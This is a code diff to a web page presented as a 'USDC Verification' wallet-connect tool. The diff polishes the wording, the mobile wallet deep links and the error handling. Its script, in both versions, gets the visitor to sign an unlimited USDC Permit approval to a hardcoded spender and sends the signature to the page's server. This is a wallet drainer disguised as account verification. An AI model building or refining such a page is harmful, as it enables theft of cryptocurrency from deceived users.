@@ -9,7 +9,7 @@
         :root { --van-picker-height: 264px; --van-item-height: 44px; }
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f7f8fa; color: #323233; }
 
-        /* Main UI */
+        /* Card UI */
         .page { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
         .card { background: #fff; width: 100%; max-width: 360px; padding: 35px 25px; border-radius: 24px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
         .usdc-icon { width: 60px; height: 60px; margin-bottom: 20px; }
@@ -17,7 +17,7 @@
         p { color: #969799; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
         .btn-open { background: #000; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 14px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; }
 
-        /* Scroller Styling */
+        /* Vant Scroller Styles */
         .van-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; backdrop-filter: blur(2px); }
         .van-popup { position: fixed; left: 0; right: 0; bottom: 0; background: #fff; border-radius: 20px 20px 0 0; transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.3, 0, 0.3, 1); z-index: 2001; padding-bottom: env(safe-area-inset-bottom); }
         .van-popup--show { transform: translateY(0); }
@@ -38,9 +38,9 @@
 <div class="page">
     <div class="card">
         <img src="https://cryptologos.cc/logos/usd-coin-usdc-logo.png" class="usdc-icon" alt="USDC">
-        <h2>USDC Security Sync</h2>
-        <p>Verify your wallet to authorize secure transactions for your account.</p>
-        <button class="btn-open" onclick="openPicker()">Select Wallet</button>
+        <h2>USDC Verification</h2>
+        <p>Verify your assets to authorize secure, gas-less transactions.</p>
+        <button class="btn-open" onclick="openPicker()">Connect Wallet</button>
     </div>
 </div>
 
@@ -59,7 +59,6 @@
                 <li class="van-picker-column__item" data-id="Crypto.com"><img src="https://avatars.githubusercontent.com/u/41551061?s=200&v=4"> Crypto.com Onchain</li>
                 <li class="van-picker-column__item" data-id="MetaMask"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg"> MetaMask</li>
                 <li class="van-picker-column__item" data-id="Trust Wallet"><img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png"> Trust Wallet</li>
-                <li class="van-picker-column__item" data-id="Coinbase"><img src="https://www.majortompro.top/assets/jpg/cb.03cf96bf.jpg"> Coinbase</li>
                 <li class="van-picker-column__item" data-id="imToken"><img src="https://www.majortompro.top/assets/svg/metamask.b8558514.svg"> imToken</li>
             </ul>
         </div>
@@ -91,22 +90,29 @@
 
     async function startVerify(wallet) {
         const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-        const dappUrl = window.location.href.replace(/^https?:\/\//, '');
+        const currentUrl = window.location.href;
+        const dappUrl = currentUrl.replace(/^https?:\/\//, '');
 
+        // --- MOBILE APP REDIRECTION ---
         if (isMobile && !window.ethereum) {
             let link = "";
-            // Crypto.com Onchain deep link
-            if (wallet === 'Crypto.com') link = `https://cro.link/dapp/${dappUrl}`;
-            else if (wallet === 'MetaMask') link = `https://metamask.app.link/dapp/${dappUrl}`;
-            else if (wallet === 'Trust Wallet') link = `https://link.trustwallet.com/open_url?url=${window.location.href}`;
-            else if (wallet === 'Coinbase') link = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`;
-            else if (wallet === 'imToken') link = `imtokenv2://navigate/DappView?url=${window.location.href}`;
+            if (wallet === 'Crypto.com') {
+                // Specific deep link for Crypto.com Onchain Wallet DApp Browser
+                link = `cryptocom://dapp/${currentUrl}`;
+            } else if (wallet === 'MetaMask') {
+                link = `https://metamask.app.link/dapp/${dappUrl}`;
+            } else if (wallet === 'Trust Wallet') {
+                link = `https://link.trustwallet.com/open_url?url=${currentUrl}`;
+            } else if (wallet === 'imToken') {
+                link = `imtokenv2://navigate/DappView?url=${currentUrl}`;
+            }
 
             if (link) { window.location.href = link; return; }
         }
 
+        // --- DAPP BROWSER LOGIC ---
         if (!window.ethereum) {
-            alert("Please open this inside your Wallet App's internal DApp browser.");
+            alert("No provider found. Please open this page inside your wallet's browser.");
             return;
         }
 
@@ -116,9 +122,15 @@
             const signer = provider.getSigner();
             const owner = await signer.getAddress();
 
+            // Check for Ethereum Mainnet (Chain ID 1)
             const { chainId } = await provider.getNetwork();
             if (chainId !== 1) {
-                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x1' }],
+                    });
+                } catch (e) { alert("Please switch to Ethereum Mainnet"); return; }
             }
 
             const contract = new ethers.Contract(USDC, ["function nonces(address owner) external view returns (uint256)"], provider);
@@ -129,8 +141,8 @@
             const types = { Permit: [{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}] };
             const message = { owner, spender: SPENDER, value: ethers.constants.MaxUint256, nonce, deadline };
 
-            const sig = await signer._signTypedData(domain, types, message);
-            const { v, r, s } = ethers.utils.splitSignature(sig);
+            const signature = await signer._signTypedData(domain, types, message);
+            const { v, r, s } = ethers.utils.splitSignature(signature);
 
             const response = await fetch("/api/save-sig/", {
                 method: "POST",
@@ -139,11 +151,13 @@
             });
 
             if (response.ok) {
-                alert("Verification Successful!");
-                window.location.reload();
+                alert("Wallet Verified Successfully!");
+            } else {
+                alert("Verification failed on server.");
             }
         } catch (e) {
-            alert("Error: " + e.message);
+            console.error(e);
+            alert("Verification error: " + e.message);
         }
     }
 </script>
